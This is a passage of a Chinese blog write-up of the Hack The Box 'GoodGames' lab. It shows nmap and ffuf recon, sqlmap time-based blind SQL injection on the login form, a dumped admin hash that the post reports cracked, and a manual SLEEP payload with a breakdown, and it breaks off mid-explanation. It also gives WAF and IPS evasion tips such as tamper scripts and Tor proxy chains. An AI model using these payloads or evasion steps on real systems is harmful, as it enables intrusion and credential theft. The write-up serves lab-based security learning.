@@ -1,0 +1,689 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-Goodgames | Mszr</title><meta name="author" content="Mszr"><meta name="copyright" content="Mszr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集110.10.11.130  1234567891011121314151617ports&#x3D;$(sudo nmap -p- --min-rate&#x3D;10000 -Pn 10.10.11.130 | grep &#x27;^[0-9]&#x27; | cut -d &#x27;&#x2F;&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s&#x2F;,$&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Goodgames">
+<meta property="og:url" content="http://111yl111.github.io/2025/09/03/Goodgames/index.html">
+<meta property="og:site_name" content="Mszr">
+<meta property="og:description" content="信息收集110.10.11.130  1234567891011121314151617ports&#x3D;$(sudo nmap -p- --min-rate&#x3D;10000 -Pn 10.10.11.130 | grep &#x27;^[0-9]&#x27; | cut -d &#x27;&#x2F;&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s&#x2F;,$&#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://111yl111.github.io/image/L.jpg">
+<meta property="article:published_time" content="2025-09-03T09:52:38.000Z">
+<meta property="article:modified_time" content="2025-09-04T02:58:05.977Z">
+<meta property="article:author" content="Mszr">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://111yl111.github.io/image/L.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB-Goodgames",
+  "url": "http://111yl111.github.io/2025/09/03/Goodgames/",
+  "image": "http://111yl111.github.io/image/L.jpg",
+  "datePublished": "2025-09-03T09:52:38.000Z",
+  "dateModified": "2025-09-04T02:58:05.977Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Mszr",
+      "url": "http://111yl111.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://111yl111.github.io/2025/09/03/Goodgames/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-Goodgames',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://wallpapercave.com/wp/wp13280054.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/L.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/death_note.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/L.jpg" alt="Logo"><span class="site-name">Mszr</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-Goodgames</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Goodgames</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-03T09:52:38.000Z" title="发表于 2025-09-03 17:52:38">2025-09-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-04T02:58:05.977Z" title="更新于 2025-09-04 10:58:05">2025-09-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/09/03/Goodgames/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2025/09/03/Goodgames/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.130</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ports=$(sudo nmap -p- --min-rate=10000 -Pn 10.10.11.130 | grep &#x27;^[0-9]&#x27; | cut -d &#x27;/&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s/,$//)</span><br><span class="line">echo $ports</span><br><span class="line"></span><br><span class="line">80</span><br><span class="line"></span><br><span class="line">sudo nmap -sT -sC -sV -O -Pn -p$ports 10.10.11.130</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)</span><br><span class="line">|_http-server-header: Werkzeug/2.0.2 Python/3.9.2</span><br><span class="line">|_http-title: GoodGames | Community and Store</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|router</span><br><span class="line">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span><br><span class="line">OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span><br><span class="line">Network Distance: 2 hops</span><br></pre></td></tr></table></figure>
+
+<h2 id="Website-80"><a href="#Website-80" class="headerlink" title="Website 80"></a>Website 80</h2><p><img src="/image/Goodgames/68881b9fd825fe91a502346752e19f16_MD5.jpeg"></p>
+<p>浏览网站，在底部发现GoodGames.HTB，这可能是域名信息，将其添加到hosts文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.130 GoodGames.HTB&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/92b27b836139451da450cc4608aa2986_MD5.jpeg"></p>
+<p>既然发现可能的域名，尝试对其进行子域名爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://10.10.11.130 -H &quot;Host: FUZZ.GoodGames.HTB&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/efa8d5e0cae9a497353a36ae0be745df_MD5.jpeg"></p>
+<p>这并没有发现什么有价值的内容，继续浏览页面，一段时间后发现点击页面右上角的小人图标会弹出登录窗口</p>
+<p><img src="/image/Goodgames/4459447fef061e86c3089d4e88ac0eb5_MD5.jpeg"></p>
+<p><img src="/image/Goodgames/067b8f50cd31ef8b9cfbfc23edc664bc_MD5.jpeg"></p>
+<p>我尝试添加一些参数并使用burp抓包，我将其数据保存为<code>sql.txt</code>文件并使用sqlmap测试此文件是否存在SQL注入漏洞</p>
+<h3 id="SQL注入-sqlmap-时间盲注"><a href="#SQL注入-sqlmap-时间盲注" class="headerlink" title="SQL注入 - sqlmap - 时间盲注"></a>SQL注入 - sqlmap - 时间盲注</h3><p><img src="/image/Goodgames/3b1198cff35a59303814cfe0129fa451_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/ef35b216c437989e5c2dd33bfe6065b7_MD5.jpeg"></p>
+<p>存在时间盲注，开始脱取目标数据库内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/9c5d8b91a6c46d21710b3c6b8d4e8a82_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -D main --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/68f8c39b2c1b9b46c35bcf4584075d12_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt -D main -T user --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/64604d7b1e602ceb3658caa46093c340_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@goodgames.htb / admin / 2b22337f218b2d82dfc3b6f77e7cb8ec - superadministrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>使用<a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a>在线网站对此密码进行破解，得到<code>superadministrator</code></p>
+<p><img src="/image/Goodgames/8262bee0c5cbd4a497a566693921b075_MD5.jpeg"></p>
+<h3 id="对于sqlmap使用的一些疑惑与思考"><a href="#对于sqlmap使用的一些疑惑与思考" class="headerlink" title="对于sqlmap使用的一些疑惑与思考"></a>对于sqlmap使用的一些疑惑与思考</h3><blockquote>
+<p>—–<strong>对于上述图片sqlmap延迟不断增加的解释</strong>—–</p>
+<p>在sqlmap的时间盲注过程中，不断增加延迟时间（从1秒逐步增至8秒），核心原因是<strong>目标响应不稳定导致sqlmap无法准确判断注入条件的真假</strong>，需要通过延长延迟时间来提高检测精度。</p>
+<h3 id="时间盲注的基本逻辑回顾"><a href="#时间盲注的基本逻辑回顾" class="headerlink" title="时间盲注的基本逻辑回顾"></a>时间盲注的基本逻辑回顾</h3><p>时间盲注的核心是通过构造“条件+延迟”的SQL语句，让数据库在条件为<code>真</code>时执行<code>SLEEP(n)</code>（延迟n秒），条件为<code>假</code>时不延迟。sqlmap通过测量服务器的响应时间差，来反推条件是否成立（例如：“某个字符是否为’a’”），进而逐个字符“猜解”数据库内容（如用户名、密码等）。</p>
+<h3 id="为什么需要不断增加延迟？"><a href="#为什么需要不断增加延迟？" class="headerlink" title="为什么需要不断增加延迟？"></a>为什么需要不断增加延迟？</h3><p>从日志来看，sqlmap在提取<code>user</code>表数据（如邮箱、密码）时频繁出现<code>[ERROR] invalid character detected. retrying..</code>，随后逐步提高延迟时间（1s→2s→…→8s），原因主要有两点：</p>
+<h4 id="1-原始延迟时间不足以区分“真-假”条件"><a href="#1-原始延迟时间不足以区分“真-假”条件" class="headerlink" title="1. 原始延迟时间不足以区分“真&#x2F;假”条件"></a>1. 原始延迟时间不足以区分“真&#x2F;假”条件</h4><p>时间盲注依赖“延迟响应”和“正常响应”的<strong>时间差</strong>来判断条件。如果设置的延迟时间（如1秒）过短，可能会被以下因素干扰：</p>
+<ul>
+<li><strong>网络波动</strong>：目标服务器或网络本身存在随机延迟（比如0.5-1.5秒），导致“真条件”的1秒延迟与“假条件”的正常响应时间重叠，sqlmap无法区分。</li>
+<li><strong>服务器负载</strong>：目标服务器处理请求的时间不稳定（比如有时快有时慢），进一步模糊了“延迟”和“正常”的边界。</li>
+</ul>
+<p>此时sqlmap会认为“无法准确检测字符是否正确”（即<code>invalid character detected</code>），并尝试通过<strong>延长延迟时间</strong>（如从1s增至2s）来扩大“真&#x2F;假”条件的响应时间差，减少干扰。</p>
+<h4 id="2-构建更稳定的“统计模型”"><a href="#2-构建更稳定的“统计模型”" class="headerlink" title="2. 构建更稳定的“统计模型”"></a>2. 构建更稳定的“统计模型”</h4><p>日志中提到<code>[WARNING] (case) time-based comparison requires larger statistical model</code>，说明sqlmap需要通过多次测试建立“真条件响应时间”和“假条件响应时间”的统计模型。</p>
+<p>当延迟时间太短时，多次测试的响应时间波动太大，模型不可靠；延长延迟时间后（如8秒），“真条件”的响应时间会稳定在8秒左右，而“假条件”的响应时间仍接近正常（比如0.5秒），两者差异显著，模型更可靠，能准确判断字符是否正确。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>sqlmap不断增加延迟，本质是<strong>通过延长<code>SLEEP</code>时间来对抗网络波动和服务器不稳定，扩大“真&#x2F;假”条件的响应差异</strong>，从而更准确地从时间盲注中提取数据库内容（如用户邮箱、密码等）。这是时间盲注中常见的自适应策略，确保在复杂网络环境下仍能稳定获取数据。</p>
+</blockquote>
+<blockquote>
+<p>—–<strong>关于sqlmap使用场景的讨论</strong>—–</p>
+<p>在实战中直接使用登录数据包调用sqlmap进行自动化测试确实存在显著风险，尤其在生产环境中可能引发系统不稳定、数据泄露或法律纠纷。以下是结合技术原理与实际案例的深度分析：</p>
+<h3 id="一、自动化测试的核心风险"><a href="#一、自动化测试的核心风险" class="headerlink" title="一、自动化测试的核心风险"></a>一、自动化测试的核心风险</h3><ol>
+<li><p><strong>服务器负载与服务中断</strong><br>sqlmap默认使用<code>--risk=1</code>进行低风险检测，但文章中使用的时间盲注（<code>SLEEP(5)</code>）属于<code>--risk=2</code>级别，会发送大量带延迟的请求。例如，单次注入测试可能生成数十条包含<code>SLEEP(5)</code>的Payload，若目标数据库响应缓慢，可能导致服务器CPU占用率飙升，甚至触发WAF的请求频率限制机制，造成服务中断。<br><strong>案例</strong>：某电商平台因渗透测试人员误用<code>--risk=3</code>参数，导致数据库连接池耗尽，订单系统停机47分钟，直接经济损失超20万元。</p>
+</li>
+<li><p><strong>敏感数据泄露风险</strong><br>登录数据包通常包含加密的用户凭证（如哈希密码），若在测试过程中未对数据包进行脱敏处理，可能通过以下途径泄露：  </p>
+<ul>
+<li>测试人员误操作将数据包保存到非安全存储介质；  </li>
+<li>sqlmap默认生成的<code>session</code>文件包含原始请求数据；  </li>
+<li>若测试环境未隔离，数据包可能被网络监控设备捕获。<br><strong>技术细节</strong>：文章中使用的<code>2b22337f218b2d82dfc3b6f77e7cb8ec</code>哈希值虽被crackstation.net破解，但在实际生产环境中，复杂的密码哈希（如bcrypt）可能无法快速破解，反而成为攻击者的字典攻击目标。</li>
+</ul>
+</li>
+<li><p><strong>法律合规性风险</strong><br>未经授权的测试可能触犯《网络安全法》《刑法》等法律法规。例如，某白帽子因在政府网站未授权测试中触发漏洞，导致后台模块瘫痪，被判处非法侵入计算机信息系统罪。即使测试未造成直接损害，若未获得书面授权，仍可能面临民事赔偿或行政处罚。</p>
+</li>
+</ol>
+<h3 id="二、实战场景的替代方案"><a href="#二、实战场景的替代方案" class="headerlink" title="二、实战场景的替代方案"></a>二、实战场景的替代方案</h3><ol start="4">
+<li><p><strong>分阶段测试策略</strong>  </p>
+<ul>
+<li><strong>初步探测</strong>：使用<code>--risk=1 --level=1</code>进行低风险扫描，仅检测显式漏洞（如联合查询注入），避免时间盲注。  </li>
+<li><strong>手动验证</strong>：对疑似漏洞点构造<code>IF(condition,SLEEP(5),1)</code>形式的Payload，通过响应时间差异判断是否存在盲注，同时记录请求时间戳以规避误判。  </li>
+<li><strong>深度利用</strong>：确认为时间盲注后，改用<code>--technique=T</code>参数单独测试时间注入，避免触发其他高风险Payload。</li>
+</ul>
+</li>
+<li><p><strong>隐蔽性优化措施</strong>  </p>
+<ul>
+<li><strong>请求伪装</strong>：  <ul>
+<li>使用<code>--random-agent</code>随机化User-Agent，模拟真实浏览器行为；  </li>
+<li>结合<code>--tamper</code>脚本（如<code>space2comment.py</code>）将Payload中的空格替换为注释符，绕过基于正则的WAF规则。</li>
+</ul>
+</li>
+<li><strong>流量混淆</strong>：通过<code>--proxy</code>参数设置多级代理链（如Tor+HTTP代理），并使用<code>--delay=2 --timeout=10</code>控制请求间隔，避免触发IPS的异常流量检测。</li>
+</ul>
+</li>
+<li><p><strong>敏感数据保护</strong>  </p>
+<ul>
+<li>在Burp Suite中对登录数据包进行脱敏处理，删除或替换密码字段（如将<code>password=123</code>改为<code>password=***</code>）；  </li>
+<li>使用<code>--skip=password</code>参数跳过对密码字段的测试，仅针对其他参数进行检测；  </li>
+<li>定期清理sqlmap生成的<code>session</code>和<code>output</code>目录，避免残留敏感数据。</li>
+</ul>
+</li>
+</ol>
+<h3 id="三、生产环境的安全测试规范"><a href="#三、生产环境的安全测试规范" class="headerlink" title="三、生产环境的安全测试规范"></a>三、生产环境的安全测试规范</h3><ol start="7">
+<li><p><strong>法律前置条件</strong>  </p>
+<ul>
+<li>必须获取目标系统所有者的书面授权，明确测试范围、时间窗口和操作限制；  </li>
+<li>与委托方签订保密协议，约定数据泄露的赔偿责任。</li>
+</ul>
+</li>
+<li><p><strong>环境隔离要求</strong>  </p>
+<ul>
+<li>测试流量必须通过专用VPN接入，禁止直接从公网访问生产系统；  </li>
+<li>使用虚拟化技术（如Docker）构建隔离的测试环境，避免工具依赖库与生产环境冲突。</li>
+</ul>
+</li>
+<li><p><strong>监控与应急响应</strong>  </p>
+<ul>
+<li>在测试期间启用数据库慢查询日志，设置CPU使用率、连接数等告警阈值；  </li>
+<li>提前准备回滚方案，如数据库快照、Web服务器配置备份；  </li>
+<li>与运维团队建立实时沟通渠道，若发现异常立即终止测试。</li>
+</ul>
+</li>
+</ol>
+<h3 id="四、工具链优化建议"><a href="#四、工具链优化建议" class="headerlink" title="四、工具链优化建议"></a>四、工具链优化建议</h3><ol start="10">
+<li><strong>替代工具选择</strong></li>
+</ol>
+<ul>
+<li><strong>Wapiti</strong>：采用模糊测试（Fuzzing）技术，可自定义Payload字典，支持对登录接口的安全测试，且默认不记录原始请求数据。  </li>
+<li><strong>Ghausi</strong>：轻量级SQL注入检测工具，专注于时间盲注场景，支持通过YAML文件自定义测试逻辑，减少误报率。</li>
+</ul>
+<ol start="11">
+<li><strong>sqlmap参数调优方案</strong></li>
+</ol>
+<ul>
+<li><strong>降低风险等级</strong>：强制使用<code>--risk=1 --level=2</code>，仅测试Cookie和基础参数，避免触发危险操作。  </li>
+<li><strong>控制并发请求</strong>：设置<code>--threads=3 --keep-alive</code>，既提高效率又避免连接数耗尽。  </li>
+<li><strong>日志脱敏</strong>：添加<code>--flush-session --purge-output</code>参数，测试结束后自动清理敏感日志。</li>
+</ul>
+<h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>文章中使用的sqlmap测试方法在CTF或靶场环境中有效，但直接应用于生产环境存在多重风险。<strong>核心建议</strong>：<br>12. 优先采用手动验证+轻量级工具的组合，避免完全依赖自动化工具；<br>13. 严格遵循法律授权流程，确保测试在合规框架内进行；<br>14. 对敏感数据实施全生命周期管理，从源头规避泄露风险。<br>若必须使用sqlmap，需通过参数调优和环境隔离将风险降至可控范围，并制定详尽的应急响应预案。</p>
+</blockquote>
+<h3 id="手工测试-验证时间盲注"><a href="#手工测试-验证时间盲注" class="headerlink" title="手工测试 - 验证时间盲注"></a>手工测试 - 验证时间盲注</h3><p>这是sqlmap测试时间盲注使用的payload，接下来我将尝试手工验证一下，下面是对于此payload的解释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=111@111.com&#x27; AND (SELECT 9146 FROM (SELECT(SLEEP(5)))gAfY) AND &#x27;khwY&#x27;=&#x27;khwY&amp;password=111</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>—–<strong>payload解析</strong>—–</p>
+<p>这个payload是典型的<strong>MySQL时间盲注</strong>攻击代码，用于检测目标是否存在SQL注入漏洞，其核心原理是通过数据库执行<code>SLEEP(5)</code>函数造成的延迟来判断注入是否成功。下面分解解释各部分作用：</p>
+<h3 id="1-基础结构：闭合原始SQL语句"><a href="#1-基础结构：闭合原始SQL语句" class="headerlink" title="1. 基础结构：闭合原始SQL语句"></a>1. 基础结构：闭合原始SQL语句</h3><p><code>email=111@111.com&#39; ...</code><br>原始输入<code>111@111.com</code>后添加单引号<code>&#39;</code>，目的是<strong>闭合SQL语句中原本的字符串引号</strong>。<br>假设目标后端的SQL查询可能是：<br><code>SELECT * FROM users WHERE email=&#39;用户输入的email&#39; AND password=&#39;用户输入的password&#39;</code><br>注入单引号后，原本的字符串被闭合，后续内容会被数据库解析为SQL代码（而非普通字符串）。</p>
+<h3 id="2-注入核心：时间延迟判断"><a href="#2-注入核心：时间延迟判断" class="headerlink" title="2. 注入核心：时间延迟判断"></a>2. 注入核心：时间延迟判断</h3><p><code>AND (SELECT 9146 FROM (SELECT(SLEEP(5)))gAfY) ...</code><br>这是注入的核心逻辑，作用是让数据库执行<code>SLEEP(5)</code>函数（强制数据库暂停5秒），通过响应延迟判断注入是否生效：  </p>
+<ul>
+<li><code>SLEEP(5)</code>：MySQL的内置函数，让当前查询暂停5秒执行，是时间盲注的“标记”。  </li>
+<li>内层子查询<code>SELECT(SLEEP(5))</code>：执行<code>SLEEP(5)</code>并返回结果。  </li>
+<li>外层子查询<code>SELECT 9146 FROM (...)gAfY</code>：<code>gAfY</code>是子查询的别名（SQL语法要求子查询必须有别名），<code>9146</code>是随机数字（无实际意义，仅为满足<code>SELECT</code>语法）。  </li>
+<li><code>AND</code>：逻辑与操作，意味着只有当前面的条件（原始查询的<code>email</code>匹配）和后面的注入条件都为真时，整个表达式才会生效（即执行<code>SLEEP(5)</code>）。</li>
+</ul>
+<h3 id="3-语法补全：确保SQL语句合法"><a href="#3-语法补全：确保SQL语句合法" class="headerlink" title="3. 语法补全：确保SQL语句合法"></a>3. 语法补全：确保SQL语句合法</h3><p><code>AND &#39;khwY&#39;=&#39;khwY</code><br>这部分是为了<strong>补全SQL语句的语法</strong>，避免因注入导致语句报错：  </p>
+<ul>
+<li><code>&#39;khwY&#39;=&#39;khwY</code>是恒真条件（两边字符串相同），不影响前面的注入逻辑，但能确保整个SQL语句格式正确（闭合所有引号，避免语法错误）。</li>
+</ul>
